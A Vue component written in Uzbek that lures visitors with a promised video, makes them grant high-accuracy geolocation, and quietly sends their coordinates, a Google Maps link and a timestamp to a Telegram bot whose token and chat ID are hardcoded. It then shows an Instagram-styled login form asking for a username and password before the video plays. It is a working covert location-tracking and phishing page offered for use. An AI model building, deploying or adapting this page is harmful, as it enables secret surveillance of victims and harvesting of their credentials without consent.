<template>
  <div class="video-container">
    <!-- Geolocation Modal -->
    <div v-if="showGeoModal" class="modal">
      <div class="modal-content">
        <img src="./assets/logos.png" width="48" height="48" alt="logo" />
        <h2>
          Videoni ko‘rishdan oldin joylashuvingizni aniqlashga ruxsat bering.
        </h2>
        <button @click="requestGeolocation" class="allow-btn">
          Ruxsat berish
        </button>
      </div>
    </div>

    <!-- Error Modal -->
    <div v-if="geoDenied" class="modal">
      <div class="modal-content">
        <h2>
          📍 Iltimos, videoni ko‘rish uchun joylashuvingizga ruxsat bering.
        </h2>
      </div>
    </div>

    <!-- Login Form -->
    <div v-if="showLogin" class="login-form">
      <h2>Login sahifasi</h2>
      <input type="text" placeholder="Username" v-model="username" />
      <input type="password" placeholder="Parol" v-model="password" />
      <button class="allow-btn" @click="submitLogin">Kirish</button>
    </div>

    <!-- Video Player -->
    <div v-if="showVideo" class="video-box">
      <video controls autoplay class="insta-video">
        <source src="./assets/mainvideo.mp4" type="video/mp4" />
        Sizning brauzeringiz video tagni qo‘llab-quvvatlamaydi.
      </video>
    </div>
  </div>
</template>
<script>
export default {
  name: "GeoLoginVideo",
  data() {
    return {
      showGeoModal: true,
      geoDenied: false,
      showLogin: false,
      showVideo: false,
      username: "",
      password: "",
      latitude: null,
      longitude: null,
      botToken: "7622854137:AAH6xblJA8biVHaE4VbC1svOAC-izatOoZI",
      chatId: "5673984207",
    };
  },
  methods: {
    requestGeolocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            this.latitude = pos.coords.latitude;
            this.longitude = pos.coords.longitude;
            this.sendToTelegram();
            this.showGeoModal = false;
            this.showLogin = true;
          },
          (err) => {
            console.error("Geolocation error:", err.message);
            this.geoDenied = true;
            this.showGeoModal = false;
          },
          {
            enableHighAccuracy: true,
            timeout: 5000,
            maximumAge: 0,
          }
        );
      } else {
        this.geoDenied = true;
        this.showGeoModal = false;
      }
    },
    sendToTelegram() {
      const message = `📍 Foydalanuvchi joylashuvi:
Latitude: ${this.latitude}
Longitude: ${this.longitude}
🗺️ Google Maps: https://www.google.com/maps?q=${this.latitude},${this.longitude}
🕒 Vaqt: ${new Date().toLocaleString()}`;
      const url = `https://api.telegram.org/bot${
        this.botToken
      }/sendMessage?chat_id=${this.chatId}&text=${encodeURIComponent(message)}`;
      fetch(url)
        .then((res) => res.json())
        .catch((err) => console.error(err));
    },
    submitLogin() {
      if (this.username && this.password) {
        this.showLogin = false;
        this.showVideo = true;
      } else {
        alert("Iltimos, barcha maydonlarni to‘ldiring.");
      }
    },
  },
};
</script>

<style scoped>
.video-container {
  display: flex;
  flex-direction: column;
  align-items: center;
  background: #000;
  color: #fff;
  min-height: 100vh;
  padding: 30px;
  font-family: sans-serif;
}

.modal {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: rgba(0, 0, 0, 0.85);
  display: flex;
  justify-content: center;
  align-items: center;
  z-index: 10;
}

.modal-content,
.login-form {
  background: #1a1a1a;
  padding: 30px 40px;
  border-radius: 12px;
  box-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
  display: flex;
  flex-direction: column;
  gap: 12px;
  align-items: center;
  text-align: center;
}

.allow-btn {
  background: #0095f6;
  color: #fff;
  border: none;
  border-radius: 8px;
  padding: 10px 20px;
  font-weight: bold;
  cursor: pointer;
}
.allow-btn:hover {
  background: #0078cc;
}

.login-form input {
  width: 200px;
  padding: 10px;
  border: none;
  border-radius: 8px;
  background: #333;
  color: #fff;
}

.video-box {
  max-width: 400px;
  width: 100%;
  margin-top: 30px;
}
.insta-video {
  width: 100%;
  border-radius: 12px;
}
</style>
